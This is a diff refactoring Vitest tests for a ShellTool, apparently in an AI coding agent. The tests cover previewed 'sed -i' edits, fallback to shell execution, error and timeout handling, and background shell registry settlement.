+        return { details, resultPromise };
+      };
+
+      /** Settles a shell fallback with 'done' and asserts the model sees it. */
+      const expectShellDone = async (resultPromise: Promise<ToolResult>) => {
+        resolveShellExecution({ output: 'done' });
+        expect((await resultPromise).llmContent).toContain('Output: done');
       };
 
       it('renders a qualifying sed -i command as an edit confirmation', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+        const details = await editDetails(buildSed());
 
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-
-        expect(details.type).toBe('edit');
-        if (details.type !== 'edit') {
-          throw new Error('expected edit confirmation');
-        }
         expect(details.filePath).toBe(expectedSedFilePath);
         expect(details.originalContent).toBe('foo\n');
         expect(details.newContent).toBe('bar\n');
@@ -1274,18 +1462,13 @@ describe('ShellTool', () => {
       });
 
       it('falls back to shell execution when sed has no prepared preview', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(
+          sedFile('foo foo\n'),
+        );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/g' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-
-        const resultPromise = invocation.execute(mockAbortSignal);
+        const resultPromise = buildSed("sed -i 's/foo/bar/g' file.txt").execute(
+          mockAbortSignal,
+        );
 
         expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
         expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
@@ -1294,26 +1477,15 @@ describe('ShellTool', () => {
           expect(mockShellExecutionService).toHaveBeenCalled(),
         );
 
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
+        await expectShellDone(resultPromise);
       });
 
       it('applies a qualifying sed -i command without spawning a shell after preview', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(
+          sedFile('foo foo\n'),
+        );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/g' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await applySed("sed -i 's/foo/bar/g' file.txt");
 
         expect(mockShellExecutionService).not.toHaveBeenCalled();
         expect(mockDebugLogger.debug).toHaveBeenCalledWith(
@@ -1323,61 +1495,30 @@ describe('ShellTool', () => {
         expect(mockFileHistoryService.trackEdit).toHaveBeenCalledWith(
           expectedSedFilePath,
         );
-        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith({
-          path: expectedSedFilePath,
-          content: 'bar bar\n',
-          toolWriteOrigin: 'shell_sed_edit',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
+          sedWrite('bar bar\n'),
+        );
         expect(result.llmContent).toContain('sed edit applied');
       });
 
       it('does not write when a simulated sed edit makes no changes', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/bar/baz/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
+        const result = await applySed("sed -i 's/bar/baz/' file.txt");
 
-        const result = await invocation.execute(mockAbortSignal);
-
-        expect(mockShellExecutionService).not.toHaveBeenCalled();
-        expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
-        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
+        expectSedSkipped();
         expect(result.llmContent).toContain('sed edit made no changes');
       });
 
       it.each([
-        {
-          code: 'ENOENT',
-          type: ToolErrorType.FILE_NOT_FOUND,
-        },
-        {
-          code: 'EACCES',
-          type: ToolErrorType.READ_CONTENT_FAILURE,
-        },
+        { code: 'ENOENT', type: ToolErrorType.FILE_NOT_FOUND },
+        { code: 'EACCES', type: ToolErrorType.READ_CONTENT_FAILURE },
       ])('maps sed execute read error $code', async ({ code, type }) => {
         mockFileSystemService.readTextFile
-          .mockResolvedValueOnce({
-            content: 'foo\n',
-            _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-          })
+          .mockResolvedValueOnce(sedFile())
           .mockRejectedValueOnce(Object.assign(new Error(code), { code }));
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await applySed();
 
         expect(mockShellExecutionService).not.toHaveBeenCalled();
         expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
@@ -1385,35 +1526,16 @@ describe('ShellTool', () => {
       });
 
       it.each([
-        {
-          code: 'EACCES',
-          type: ToolErrorType.PERMISSION_DENIED,
-        },
-        {
-          code: 'ENOSPC',
-          type: ToolErrorType.NO_SPACE_LEFT,
-        },
-        {
-          code: 'EISDIR',
-          type: ToolErrorType.TARGET_IS_DIRECTORY,
-        },
+        { code: 'EACCES', type: ToolErrorType.PERMISSION_DENIED },
+        { code: 'ENOSPC', type: ToolErrorType.NO_SPACE_LEFT },
+        { code: 'EISDIR', type: ToolErrorType.TARGET_IS_DIRECTORY },
       ])('maps sed write error $code', async ({ code, type }) => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
         mockFileSystemService.writeTextFile.mockRejectedValue(
           Object.assign(new Error(code), { code }),
         );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await applySed();
 
         expect(mockShellExecutionService).not.toHaveBeenCalled();
         expect(result.error?.type).toBe(type);
@@ -1425,41 +1547,25 @@ describe('ShellTool', () => {
       });
 
       it('continues applying a simulated sed edit when file history tracking fails', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
         mockFileHistoryService.trackEdit.mockRejectedValue(
           new Error('backup failed'),
         );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await applySed();
 
         expect(mockShellExecutionService).not.toHaveBeenCalled();
         expect(mockDebugLogger.warn).toHaveBeenCalledWith(
           expect.stringContaining('file history trackEdit failed for sed edit'),
         );
-        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith({
-          path: expectedSedFilePath,
-          content: 'bar\n',
-          toolWriteOrigin: 'shell_sed_edit',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
+          sedWrite('bar\n'),
+        );
         expect(result.llmContent).toContain('sed edit applied');
       });
 
       it('logs non-fatal sed attribution and read-cache failures', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
         vi.spyOn(
           CommitAttributionService.getInstance(),
           'recordEdit',
@@ -1471,119 +1577,69 @@ describe('ShellTool', () => {
           throw new Error('cache failed');
         });
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        await confirmSedEdit(invocation);
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await applySed();
 
         expect(mockShellExecutionService).not.toHaveBeenCalled();
         expect(mockFileSystemService.writeTextFile).toHaveBeenCalled();
-        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'commit attribution recordEdit failed for sed edit',
-          ),
-        );
-        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'file read cache recordWrite failed for sed edit',
-          ),
-        );
+        for (const warning of [
+          'commit attribution recordEdit failed for sed edit',
+          'file read cache recordWrite failed for sed edit',
+        ]) {
+          expect(mockDebugLogger.warn).toHaveBeenCalledWith(
+            expect.stringContaining(warning),
+          );
+        }
         expect(result.llmContent).toContain('sed edit applied');
       });
 
       it('applies confirmed inline modifications to a simulated sed edit', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
         const recordEditSpy = vi.spyOn(
           CommitAttributionService.getInstance(),
           'recordEdit',
         );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        await details.onConfirm(ToolConfirmationOutcome.ProceedOnce, {
+        const invocation = buildSed();
+        await confirmWith(invocation, ToolConfirmationOutcome.ProceedOnce, {
           newContent: 'baz\n',
         });
-
         const result = await invocation.execute(mockAbortSignal);
 
-        expect(mockShellExecutionService).not.toHaveBeenCalled();
-        expect(recordEditSpy).not.toHaveBeenCalled();
-        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith({
-          path: expectedSedFilePath,
-          content: 'baz\n',
-          toolWriteOrigin: 'shell_sed_edit',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        expectNotCalled(mockShellExecutionService, recordEditSpy);
+        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
+          sedWrite('baz\n'),
+        );
         expect(result.llmContent).toContain('sed edit applied');
       });
 
       it('does not write when sed execution is cancelled after reading', async () => {
         const abortController = new AbortController();
         mockFileSystemService.readTextFile
-          .mockResolvedValueOnce({
-            content: 'foo\n',
-            _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-          })
+          .mockResolvedValueOnce(sedFile())
           .mockImplementationOnce(async () => {
             abortController.abort();
-            return {
-              content: 'foo\n',
-              _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-            };
+            return sedFile();
           });
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        const details = await invocation.getConfirmationDetails(
-          abortController.signal,
-        );
-        expect(details.type).toBe('edit');
-        if (details.type !== 'edit') {
-          throw new Error('expected edit confirmation');
-        }
-        await details.onConfirm(ToolConfirmationOutcome.ProceedOnce);
-
+        const invocation = buildSed();
+        await confirmSedEdit(invocation, abortController.signal);
         const result = await invocation.execute(abortController.signal);
 
-        expect(mockShellExecutionService).not.toHaveBeenCalled();
-        expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
-        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
+        expectSedSkipped();
         expect(result.llmContent).toContain('Command was cancelled');
       });
 
       it('awaits an in-flight sed write after cancellation starts', async () => {
         const abortController = new AbortController();
         let resolveWrite!: () => void;
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
         mockFileSystemService.writeTextFile.mockReturnValue(
           new Promise((resolve) => {
             resolveWrite = () => resolve({});
           }),
         );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+        const invocation = buildSed();
         await confirmSedEdit(invocation);
 
         const resultPromise = invocation.execute(abortController.signal);
@@ -1608,16 +1664,9 @@ describe('ShellTool', () => {
 
       it('rejects simulated sed edits when the file was not read first', async () => {
         mockFileReadCache.check.mockReturnValue({ state: 'unknown' });
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+        const invocation = buildSed();
 
         await expect(
           invocation.getConfirmationDetails(mockAbortSignal),
@@ -1632,117 +1681,71 @@ describe('ShellTool', () => {
       });
 
       it('reports timeout when a prepared sed edit times out before execution', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-          timeout: 5000,
-        });
+        const invocation = buildSed(SED, { timeout: 5000 });
         await confirmSedEdit(invocation);
 
-        const originalAbortSignal = globalThis.AbortSignal;
-        const mockTimeoutSignal = {
-          aborted: true,
-          reason: { name: 'TimeoutError' },
-          addEventListener: vi.fn(),
-          removeEventListener: vi.fn(),
-        } as unknown as AbortSignal;
-        vi.stubGlobal('AbortSignal', {
-          ...originalAbortSignal,
-          timeout: vi.fn().mockReturnValue(mockTimeoutSignal),
-          any: vi.fn().mockReturnValue(mockTimeoutSignal),
+        stubAbortSignal(fakeSignal(true, { name: 'TimeoutError' }));
+        const result = await invocation.execute(mockAbortSignal);
+
+        expectSedSkipped();
+        const message =
+          'Command timed out after 5000ms before it could complete.';
+        const text = `${message} There was no output before it timed out.`;
+        expect(result.llmContent).toBe(text);
+        expect(shellResultText(result.returnDisplay)).toBe(text);
+        expect(result.error).toEqual({
+          message,
+          type: ToolErrorType.EXECUTION_TIMEOUT,
         });
-
-        try {
-          const result = await invocation.execute(mockAbortSignal);
-
-          expect(mockShellExecutionService).not.toHaveBeenCalled();
-          expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
-          expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
-          expect(result.llmContent).toBe(
-            'Command timed out after 5000ms before it could complete. There was no output before it timed out.',
-          );
-          expect(result.returnDisplay).toBe(
-            'Command timed out after 5000ms before it could complete. There was no output before it timed out.',
-          );
-          expect(result.error).toEqual({
-            message: 'Command timed out after 5000ms before it could complete.',
-            type: ToolErrorType.EXECUTION_TIMEOUT,
-          });
-        } finally {
-          vi.stubGlobal('AbortSignal', originalAbortSignal);
-        }
       });
 
       it('switches approval mode when sed edit confirmation proceeds always', async () => {
-        mockFileSystemService.readTextFile.mockResolvedValue({
-          content: 'foo\n',
-          _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-        });
+        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        await details.onConfirm(ToolConfirmationOutcome.ProceedAlways);
+        await confirmWith(buildSed(), ToolConfirmationOutcome.ProceedAlways);
 
         expect(mockConfig.setApprovalMode).toHaveBeenCalledWith(
           ApprovalMode.AUTO_EDIT,
         );
       });
 
-      it('falls back to shell execution for sed backup suffixes', async () => {
-        const invocation = shellTool.build({
-          command: "sed -i.bak 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+      it.each([
+        [
+          'falls back to shell execution for sed backup suffixes',
+          "sed -i.bak 's/foo/bar/' file.txt",
+        ],
+        [
+          'falls back to shell execution for env-prefixed shell wrappers',
+          'LC_ALL=C bash -c "sed -i \'s/foo/bar/\' file.txt"',
+        ],
+        [
+          'falls back to shell execution for env-prefixed unwrapped sed commands',
+          `bash -c "LC_ALL=C sed -i 's/foo/bar/' file.txt"`,
+        ],
+      ])('%s', async (_title, command) => {
+        const { resultPromise } = await previewExec(command);
 
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        const resultPromise = invocation.execute(mockAbortSignal);
-
-        expect(details.type).toBe('exec');
         expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
         expect(mockShellExecutionService).toHaveBeenCalled();
 
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
+        await expectShellDone(resultPromise);
         expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
       });
 
       it('falls back to shell execution for background sed commands', async () => {
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: true,
-        });
-
-        const result = await invocation.execute(mockAbortSignal);
+        const result = await buildSed(SED, { is_background: true }).execute(
+          mockAbortSignal,
+        );
 
         expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
         expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          "sed -i 's/foo/bar/' file.txt",
-          '/test/dir',
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-          { streamStdout: true },
-        );
-        expect(result.llmContent).toContain('Background shell started.');
-        expect(result.llmContent).toContain('id: bg_');
+        expectSpawned("sed -i 's/foo/bar/' file.txt", {
+          cwd: '/test/dir',
+          background: true,
+        });
+        expectText(result.llmContent, ['Background shell started.', 'id: bg_']);
       });
 
       it('falls back to shell execution when sed preview cannot read the file', async () => {
@@ -1750,17 +1753,8 @@ describe('ShellTool', () => {
           new Error('not text'),
         );
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+        const { details, resultPromise } = await previewExec();
 
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        const resultPromise = invocation.execute(mockAbortSignal);
-
-        expect(details.type).toBe('exec');
         if (details.type !== 'exec') {
           throw new Error('expected exec confirmation');
         }
@@ -1770,10 +1764,7 @@ describe('ShellTool', () => {
         expect(mockFileSystemService.readTextFile).toHaveBeenCalledTimes(1);
         expect(mockShellExecutionService).toHaveBeenCalled();
 
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
+        await expectShellDone(resultPromise);
         expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
       });
 
@@ -1782,186 +1773,63 @@ describe('ShellTool', () => {
           isSymbolicLink: () => true,
         } as fs.Stats);
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
+        const { resultPromise } = await previewExec();
 
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        const resultPromise = invocation.execute(mockAbortSignal);
-
-        expect(details.type).toBe('exec');
         expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
         expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
         expect(mockShellExecutionService).toHaveBeenCalled();
 
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
-      });
-
-      it('falls back to shell execution for env-prefixed shell wrappers', async () => {
-        const invocation = shellTool.build({
-          command: 'LC_ALL=C bash -c "sed -i \'s/foo/bar/\' file.txt"',
-          directory: '/test/dir',
-          is_background: false,
-        });
-
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        const resultPromise = invocation.execute(mockAbortSignal);
-
-        expect(details.type).toBe('exec');
-        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
-        expect(mockShellExecutionService).toHaveBeenCalled();
-
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
-        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
-      });
-
-      it('falls back to shell execution for env-prefixed unwrapped sed commands', async () => {
-        const invocation = shellTool.build({
-          command: `bash -c "LC_ALL=C sed -i 's/foo/bar/' file.txt"`,
-          directory: '/test/dir',
-          is_background: false,
-        });
-
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        const resultPromise = invocation.execute(mockAbortSignal);
-
-        expect(details.type).toBe('exec');
-        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
-        expect(mockShellExecutionService).toHaveBeenCalled();
-
-        resolveShellExecution({ output: 'done' });
-        const result = await resultPromise;
-
-        expect(result.llmContent).toContain('Output: done');
-        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
+        await expectShellDone(resultPromise);
       });
 
       it('rejects when the file changed after the sed edit confirmation', async () => {
         mockFileSystemService.readTextFile
-          .mockResolvedValueOnce({
-            content: 'foo\n',
-            _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-          })
-          .mockResolvedValueOnce({
-            content: 'baz\n',
-            _meta: { bom: false, encoding: 'utf-8', lineEnding: 'lf' },
-          });
+          .mockResolvedValueOnce(sedFile())
+          .mockResolvedValueOnce(sedFile('baz\n'));
 
-        const invocation = shellTool.build({
-          command: "sed -i 's/foo/bar/' file.txt",
-          directory: '/test/dir',
-          is_background: false,
-        });
-        const details =
-          await invocation.getConfirmationDetails(mockAbortSignal);
-        await details.onConfirm(ToolConfirmationOutcome.ProceedOnce);
-
+        const invocation = buildSed();
+        await confirmWith(invocation);
         const result = await invocation.execute(mockAbortSignal);
 
-        expect(mockShellExecutionService).not.toHaveBeenCalled();
-        expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
-        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
+        expectSedSkipped();
         expect(result.error?.type).toBe(ToolErrorType.FILE_CHANGED_SINCE_READ);
       });
     });
 
     it('runs background commands as managed pool entries (no & / pgrep wrap)', async () => {
-      const registry = mockConfig.getBackgroundShellRegistry();
-      const invocation = shellTool.build({
-        command: 'npm start',
-        is_background: true,
-      });
+      const result = await runBg('npm start');
 
-      const result = await invocation.execute(mockAbortSignal);
-
-      // Spawn happens with the unwrapped command — no '&', no pgrep envelope.
-      // Streaming mode is on so dev-server / watcher output flushes to the
-      // output file as it arrives instead of buffering until exit.
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        'npm start',
-        '/test/dir',
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
-      // Entry registered with the spawn pid.
+      // Spawned unwrapped (no '&', no pgrep envelope), streaming so dev-server
+      // / watcher output reaches the output file as it arrives.
+      expectSpawned('npm start', { cwd: '/test/dir', background: true });
       expect(registry.register).toHaveBeenCalledTimes(1);
-      const entry = (registry.register as Mock).mock.calls[0][0];
+      const entry = registeredEntry();
       expect(entry.command).toBe('npm start');
       expect(entry.cwd).toBe('/test/dir');
       expect(entry.status).toBe('running');
       expect(entry.pid).toBe(12345);
       expect(typeof entry.shellId).toBe('string');
       expect(entry.outputPath).toContain('shell-');
-      // Returns immediately with id + output path; agent's turn isn't blocked.
-      expect(result.llmContent).toContain(entry.shellId);
-      expect(result.llmContent).toContain(entry.outputPath);
+      // Returns immediately with id + output path; the turn isn't blocked.
+      expectText(result.llmContent, [entry.shellId, entry.outputPath]);
     });
 
     it('settles a background entry as completed when the process exits cleanly', async () => {
-      const registry = mockConfig.getBackgroundShellRegistry();
-      const invocation = shellTool.build({
-        command: 'true',
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      const entry = (registry.register as Mock).mock.calls[0][0];
-
-      resolveExecutionPromise({
-        rawOutput: Buffer.from(''),
-        output: '',
-        exitCode: 0,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-      // Flush the .then() microtask attached to resultPromise.
-      await new Promise((r) => setImmediate(r));
+      const entry = await runBgToExit('true');
 
       expect(registry.complete).toHaveBeenCalledWith(
         entry.shellId,
         0,
         expect.any(Number),
       );
-      expect(registry.fail).not.toHaveBeenCalled();
-      expect(registry.cancel).not.toHaveBeenCalled();
+      expectNotCalled(registry.fail, registry.cancel);
     });
 
     it('settles a background entry as failed when ShellExecutionService reports error', async () => {
-      const registry = mockConfig.getBackgroundShellRegistry();
-      const invocation = shellTool.build({
-        command: 'no-such-command',
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      const entry = (registry.register as Mock).mock.calls[0][0];
-
-      resolveExecutionPromise({
-        rawOutput: Buffer.from(''),
-        output: '',
+      const entry = await runBgToExit('no-such-command', {
         exitCode: null,
-        signal: null,
         error: new Error('spawn ENOENT'),
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
       });
-      await new Promise((r) => setImmediate(r));
 
       expect(registry.fail).toHaveBeenCalledWith(
         entry.shellId,
@@ -1972,28 +1840,9 @@ describe('ShellTool', () => {
     });
 
     it('settles a background entry as failed on non-zero exit code (no error object)', async () => {
-      const registry = mockConfig.getBackgroundShellRegistry();
-      const invocation = shellTool.build({
-        command: 'false',
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      const entry = (registry.register as Mock).mock.calls[0][0];
-
-      // ShellExecutionService reports a clean non-zero exit (no error object,
-      // no signal) — historically this got bucketed as `completed`, which
-      // misreported a failed `npm test` / `false` as a success.
-      resolveExecutionPromise({
-        rawOutput: Buffer.from(''),
-        output: '',
-        exitCode: 1,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-      await new Promise((r) => setImmediate(r));
+      // A clean non-zero exit (no error, no signal) was once bucketed as
+      // `completed`, misreporting a failed `npm test` / `false` as success.
+      const entry = await runBgToExit('false', { exitCode: 1 });
 
       expect(registry.fail).toHaveBeenCalledWith(
         entry.shellId,
@@ -2004,13 +1853,9 @@ describe('ShellTool', () => {
     });
 
     describe('background settle waits for the output stream flush', () => {
-      // `stream.end()` is asynchronous — pending writes can still be in
-      // the libuv queue when it returns. Transitioning the registry
-      // before the stream's 'finish' event lets consumers observe a
-      // terminal status (and the status sidecar report it) while the
-      // trailing output bytes are not yet on disk. These tests pin the
-      // ordering with a stream whose events fire only when the test
-      // says so.
+      // `stream.end()` is async: transitioning before 'finish' shows consumers
+      // (and the status sidecar) a terminal status while trailing output is
+      // not yet on disk. These streams fire events only when the test says so.
       const makeDeferredStream = () => {
         const handlers = new Map<string, Array<() => void>>();
         return {
@@ -2037,26 +1882,7 @@ describe('ShellTool', () => {
         vi.mocked(fs.createWriteStream).mockReturnValueOnce(
           deferred as unknown as fs.WriteStream,
         );
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'true',
-          is_background: true,
-        });
-        await invocation.execute(mockAbortSignal);
-        const entry = (registry.register as Mock).mock.calls[0][0];
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        // Flush the .then() microtask attached to resultPromise.
-        await new Promise((r) => setImmediate(r));
+        const entry = await runBgToExit('true');
         if (expectFlushRequested) {
           // The stream has been asked to flush…
           expect(deferred.end).toHaveBeenCalledTimes(1);
@@ -2064,126 +1890,90 @@ describe('ShellTool', () => {
         return { shellId: entry.shellId };
       };
 
-      it('holds the registry transition until the stream finish event', async () => {
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const deferred = makeDeferredStream();
-        const { shellId } = await startBackgroundAndExit(deferred);
-
-        // …but the registry must NOT transition before the flush
-        // completes — this is the truncated-log window.
-        expect(registry.complete).not.toHaveBeenCalled();
-
-        deferred.emit('finish');
+      const expectCompletedOnce = (shellId: string) => {
         expect(registry.complete).toHaveBeenCalledTimes(1);
         expect(registry.complete).toHaveBeenCalledWith(
           shellId,
           0,
           expect.any(Number),
         );
+      };
 
-        // Exactly once: the still-armed 'error' listener firing later
-        // must not re-transition. (A second 'finish' emit would be
-        // vacuous — `once` semantics already drained its handler.)
+      it('holds the registry transition until the stream finish event', async () => {
+        const deferred = makeDeferredStream();
+        const { shellId } = await startBackgroundAndExit(deferred);
+
+        // …but the registry must NOT transition before the flush completes:
+        // this is the truncated-log window.
+        expect(registry.complete).not.toHaveBeenCalled();
+
+        deferred.emit('finish');
+        expectCompletedOnce(shellId);
+
+        // The still-armed 'error' listener firing later must not re-transition.
+        // (A second 'finish' would be vacuous: `once` drained its handler.)
         deferred.emit('error');
         expect(registry.complete).toHaveBeenCalledTimes(1);
       });
 
       it('still transitions when the stream errors instead of finishing', async () => {
-        // A dead stream (EIO / ENOSPC racing `.end()`) must not strand
-        // the entry as running — the flush is best-effort, the
-        // transition is mandatory.
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // A dead stream (EIO / ENOSPC racing `.end()`) must not strand the
+        // entry as running: the flush is best-effort, the transition mandatory.
         const deferred = makeDeferredStream();
         const { shellId } = await startBackgroundAndExit(deferred);
